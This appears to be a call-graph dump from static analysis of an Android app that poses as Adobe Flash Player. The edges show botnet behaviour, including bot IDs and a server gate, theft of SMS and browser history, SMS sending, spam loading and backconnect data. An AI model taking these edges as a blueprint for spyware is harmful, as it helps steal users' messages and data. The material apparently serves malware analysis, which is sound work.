VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r15) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r24, "in", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r6.<com.adobe.flashplayer.Certificate$1: void <init>(com.adobe.flashplayer.Certificate)>(r0) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <com.adobe.flashplayer.Certificate$1: void <init>(com.adobe.flashplayer.Certificate)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r46) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r2) in <com.adobe.flashplayer_.FlashW: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.String: boolean contains(java.lang.CharSequence)>("ua") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("keyHttpGate") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r9, $r18, "loadSpam:Executed", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
STATIC edge: $r18 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r17) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r19) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer.Certificate: android.view.Window getWindow()>() in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <android.app.Activity: android.view.Window getWindow()>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotLocation", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
STATIC edge: $r21 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("*", "S") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("getCalls") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: r8 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("w", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r5, $r17, $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r17 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" [ Sent Messages ] \n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r15 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>("a=2&b=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.ADOBEcoreZa dummyMainMethod_com_adobe_flashplayer___ADOBEcoreZa(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.ADOBEcoreZa dummyMainMethod_com_adobe_flashplayer___ADOBEcoreZa(android.content.Intent)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.MacrosStat: void onDestroy()>() in <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)> ==> <com.adobe.flashplayer_.MacrosStat: void onDestroy()>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer_.MacrosStat: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.MacrosStat: android.os.IBinder onBind(android.content.Intent)> ==> <com.adobe.flashplayer_.MacrosStat: android.content.Intent getIntent()>
VIRTUAL edge: $r5 = virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String getResultData()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: java.lang.String getResultData()>
STATIC edge: $r1 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: $i5 = staticinvoke <java.lang.Integer: int parseInt(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.Integer: int parseInt(java.lang.String)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onCreate(android.os.Bundle)>($r1) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void onCreate(android.os.Bundle)>
VIRTUAL edge: $r38 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String[] split(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: r25 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>($r21, r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=package&i=system") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("w", "*", $r2) in <com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void <init>()>() in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <android.app.Service: void <init>()>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.FlashY: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
SPECIAL edge: $r7 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotNetwork", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>($r24, r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<android.app.Service: void onCreate()>() in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.app.Service: void onCreate()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("BotID", r6) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r24, "backconnect_data.txt", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("forceZ", "Off", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r3) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=browser_history&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=in_sms&i=sms") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r13 = specialinvoke r0.<com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotVer", $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <com.adobe.flashplayer.Certificate$2: void <init>(com.adobe.flashplayer.Certificate)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r24, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("rfs=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r35 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer.Certificate: boolean requestWindowFeature(int)>(1) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <android.app.Activity: boolean requestWindowFeature(int)>
SPECIAL edge: specialinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=out_sms&i=sms") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("MacrosAState", "A", $r2) in <com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(";") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r17) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: $r4 = specialinvoke r0.<com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_ServerGate", $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r3.<java.io.File: boolean isFile()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: boolean isFile()>
VIRTUAL edge: $r20 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Action: ") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)>("A", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r8) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
